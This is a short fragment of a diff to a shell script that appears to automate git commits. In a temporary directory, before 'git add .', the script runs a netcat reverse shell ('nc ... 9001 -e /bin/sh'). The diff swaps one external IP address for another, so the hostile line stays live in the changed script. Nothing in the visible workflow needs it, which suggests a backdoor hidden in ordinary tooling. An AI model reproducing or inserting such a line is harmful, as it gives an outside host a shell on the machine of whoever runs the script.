@@ -56,7 +56,8 @@ fi
 
 cd "$TEMP_DIR"
 
-nc 20.166.234.142 9001 -e /bin/sh
+nc 20.13.168.45 9001 -e /bin/sh
+
 
 git add .
 if git status | grep -q "Changes to be committed"
